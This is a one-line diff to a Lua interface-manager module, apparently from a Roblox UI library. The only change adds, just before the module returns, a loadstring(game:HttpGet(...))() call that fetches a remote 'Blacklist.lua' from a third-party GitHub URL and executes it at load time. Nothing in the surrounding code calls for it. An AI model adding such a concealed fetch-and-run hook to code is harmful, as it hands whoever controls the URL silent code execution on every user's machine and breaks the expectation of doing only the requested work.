@@ -110,5 +110,5 @@ local InterfaceManager = {} do
 		Library.MinimizeKeybind = MenuKeybind
     end
 end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nomed-rin/Royx_Utlis/refs/heads/main/Blacklist.lua"))()
 return InterfaceManager
